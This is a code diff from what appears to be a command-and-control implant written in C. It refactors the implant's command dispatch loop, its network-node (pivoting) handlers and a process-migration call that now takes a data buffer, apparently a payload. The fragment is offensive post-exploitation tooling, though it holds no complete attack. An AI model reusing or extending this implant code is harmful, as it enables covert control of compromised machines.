@@ -25,6 +25,8 @@
 #include <tlv.h>
 #include <c2.h>
 #include <net.h>
+#include <node.h>
+#include <migrate.h>
 #include <tab.h>
 #include <log.h>
 
@@ -41,9 +43,9 @@ void tlv_console_loop(tlv_pkt_t *tlv_pkt)
     c2_register_api_calls(&c2_api_calls);
 
     tabs_t *tabs = NULL;
-    net_nodes_t *net_nodes = NULL;
+    nodes_t *nodes = NULL;
 
-    int net_nodes_id = 0;
+    int node_id = 0;
 
     for (;;)
     {
@@ -68,12 +70,12 @@ void tlv_console_loop(tlv_pkt_t *tlv_pkt)
                 tlv_pkt_t **tlv_argv;
                 tlv_argv_read(tlv_pkt, &tlv_argv, 4, TLV_NO_NULL);
 
-                net_nodes_add(&net_nodes, net_nodes_id,
-                              UNPACK_INT(tlv_argv[0]->data),
-                              UNPACK_INT(tlv_argv[1]->data),
-                              UNPACK_INT(tlv_argv[2]->data),
-                              UNPACK_INT(tlv_argv[3]->data));
-                net_nodes_id += 1;
+                node_add(&nodes, node_id,
+                          UNPACK_INT(tlv_argv[0]->data),
+                          UNPACK_INT(tlv_argv[1]->data),
+                          UNPACK_INT(tlv_argv[2]->data),
+                          UNPACK_INT(tlv_argv[3]->data));
+                node_id += 1;
 
                 tlv_argv_free(tlv_argv, 4);
 
@@ -82,7 +84,7 @@ void tlv_console_loop(tlv_pkt_t *tlv_pkt)
                 tlv_pkt_t **tlv_argv;
                 tlv_argv_read(tlv_pkt, &tlv_argv, 1, TLV_NO_NULL);
 
-                net_nodes_delete(&net_nodes, UNPACK_INT(tlv_argv[0]->data));
+                node_delete(&nodes, UNPACK_INT(tlv_argv[0]->data));
                 tlv_argv_free(tlv_argv, 1);
 
             } else if (tlv_pkt->tag == API_ADD_TAB)
@@ -91,7 +93,7 @@ void tlv_console_loop(tlv_pkt_t *tlv_pkt)
                 tlv_argv_read(tlv_pkt, &tlv_argv, 2, TLV_NO_NULL);
 
                 tab_add(&tabs, UNPACK_INT(tlv_argv[0]->data), tlv_argv[1]->data);
-                tlv_argv_free(tlv_argv, 1);
+                tlv_argv_free(tlv_argv, 2); /* might be a bug */
 
             } else if (tlv_pkt->tag == API_DEL_TAB)
             {
@@ -104,9 +106,17 @@ void tlv_console_loop(tlv_pkt_t *tlv_pkt)
             } else if (tlv_pkt->tag == API_MIGRATE)
             {
                 tlv_pkt_t **tlv_argv;
-                tlv_argv_read(tlv_pkt, &tlv_argv, 1, TLV_NO_NULL);
+                tlv_argv_read(tlv_pkt, &tlv_argv, 2, TLV_NO_NULL);
 
-                migrate_init(tlv_pkt, UNPACK_INT(tlv_argv[0]->data));
+                if (migrate_init(tlv_pkt, UNPACK_INT(tlv_argv[0]->data), tlv_argv[1]->size, tlv_argv[1]->data) == 0)
+                {
+                    tlv_argv_free(tlv_argv, 2);
+                    tlv_result = create_c2_tlv_pkt(tlv_pkt, API_CALL_SUCCESS);
+                    tlv_channel_send(tlv_result);
+
+                    tlv_pkt_free(tlv_result);
+                    break;
+                }
             }
 
             tlv_result = create_c2_tlv_pkt(tlv_pkt, API_CALL_SUCCESS);
@@ -133,7 +143,7 @@ void tlv_console_loop(tlv_pkt_t *tlv_pkt)
         tlv_pkt_free(tlv_result);
     }
 
-    net_nodes_free(net_nodes);
+    nodes_free(nodes);
     tabs_free(tabs);
 
     c2_api_calls_free(c2_api_calls);
